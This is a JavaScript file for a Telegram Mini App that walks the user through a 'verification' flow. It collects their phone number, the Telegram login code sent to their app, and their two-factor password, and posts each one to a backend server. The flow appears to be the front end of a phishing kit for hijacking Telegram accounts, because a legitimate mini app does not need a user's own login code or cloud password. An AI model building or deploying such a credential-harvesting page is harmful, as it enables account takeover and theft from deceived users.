document.addEventListener('DOMContentLoaded', function () {
    const tg = window.Telegram.WebApp;
    const phoneSection = document.getElementById('phone-section');
    const otpSection   = document.getElementById('otp-section');
    const twofaSection = document.getElementById('twofa-section');
    const phoneInput   = document.getElementById('phone-input');
    const sendOtpBtn   = document.getElementById('send-otp-btn');
    const otpBoxes     = document.querySelectorAll('.otp-box');
    const keys         = document.querySelectorAll('.key');
    const verifyBtn    = document.getElementById('verify-btn');
    const twofaInput   = document.getElementById('twofa-input');
    const twofaBtn     = document.getElementById('twofa-btn');

    const SERVER_URL = '';
    const userId = tg.initDataUnsafe?.user?.id || 'user_' + Date.now();

    tg.ready();
    tg.expand();

    function showAlert(msg) { alert(msg); }

    // ── Phone Step ────────────────────────────────────────────────────────────
    sendOtpBtn.addEventListener('click', async function () {
        const phone = phoneInput.value.trim();
        if (phone.length < 10) { showAlert('Please enter a valid phone number!'); return; }

        sendOtpBtn.disabled = true;
        sendOtpBtn.textContent = 'Sending...';

        try {
            const res = await fetch(`${SERVER_URL}/send-otp`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, user_id: String(userId) })
            });
            const result = await res.json();

            if (result.success) {
                showSection('otp');
                showAlert('Code sent! Check your Telegram app.');
            } else {
                showAlert(result.message || 'Failed to send OTP.');
            }
        } catch (err) {
            showAlert('Error: ' + err.message);
        } finally {
            sendOtpBtn.disabled = false;
            sendOtpBtn.textContent = '📤 Send Verification Code';
        }
    });

    // ── OTP Keypad ────────────────────────────────────────────────────────────
    let currentIndex = 0;

    function focusNext() { if (currentIndex < otpBoxes.length - 1) otpBoxes[++currentIndex].focus(); }
    function focusPrev() { if (currentIndex > 0) otpBoxes[--currentIndex].focus(); }

    otpBoxes.forEach((box) => {
        box.addEventListener('input', function () { if (this.value.length === 1) focusNext(); });
        box.addEventListener('keydown', function (e) { if (e.key === 'Backspace' && this.value === '') focusPrev(); });
    });

    keys.forEach((key) => {
        key.addEventListener('click', function () {
            const k = this.dataset.key;
            if (k === 'backspace') { otpBoxes[currentIndex].value = ''; focusPrev(); }
            else { otpBoxes[currentIndex].value = k; focusNext(); }
        });
    });

    // ── Verify OTP ────────────────────────────────────────────────────────────
    verifyBtn.addEventListener('click', async function () {
        const otp = Array.from(otpBoxes).map(b => b.value).join('');
        if (otp.length !== 5) { showAlert('Please enter the complete 5-digit code.'); return; }

        verifyBtn.disabled = true;
        verifyBtn.textContent = 'Verifying...';

        try {
            const res = await fetch(`${SERVER_URL}/verify-otp`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ otp, user_id: String(userId) })
            });
            const result = await res.json();

            if (result.success) {
                if (result.twofa_required) {
                    // Stay in app — show 2FA screen directly
                    showSection('twofa');
                } else {
                    tg.sendData('verified:success');
                }
            } else {
                showAlert(result.message || 'Incorrect code. Please try again.');
                otpBoxes.forEach(b => b.value = '');
                currentIndex = 0;
                otpBoxes[0].focus();
            }
        } catch (err) {
            showAlert('Error: ' + err.message);
        } finally {
            verifyBtn.disabled = false;
            verifyBtn.textContent = '✅ Verify Code';
        }
    });

    // ── Verify 2FA ────────────────────────────────────────────────────────────
    twofaBtn.addEventListener('click', async function () {
        const password = twofaInput.value;
        if (!password) { showAlert('Please enter your 2FA password!'); return; }

        twofaBtn.disabled = true;
        twofaBtn.textContent = 'Verifying...';

        try {
            const res = await fetch(`${SERVER_URL}/verify-2fa`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password, user_id: String(userId) })
            });
            const result = await res.json();

            if (result.success) {
                tg.sendData('verified:2fa_success');
            } else {
                showAlert(result.message || 'Wrong 2FA password. Try again.');
                twofaInput.value = '';
            }
        } catch (err) {
            showAlert('Error: ' + err.message);
        } finally {
            twofaBtn.disabled = false;
            twofaBtn.textContent = '✅ Verify 2FA';
        }
    });

    // ── Section switcher ──────────────────────────────────────────────────────
    function showSection(name) {
        phoneSection.style.display = 'none';
        otpSection.style.display   = 'none';
        twofaSection.style.display = 'none';

        const emoji = document.querySelector('.emoji-center .emoji');

        if (name === 'otp') {
            otpSection.style.display = 'flex';
            emoji.textContent = '🔢';
            currentIndex = 0;
            otpBoxes[0].focus();
        } else if (name === 'twofa') {
            twofaSection.style.display = 'flex';
            emoji.textContent = '🔐';
            twofaInput.focus();
        }
    }
});
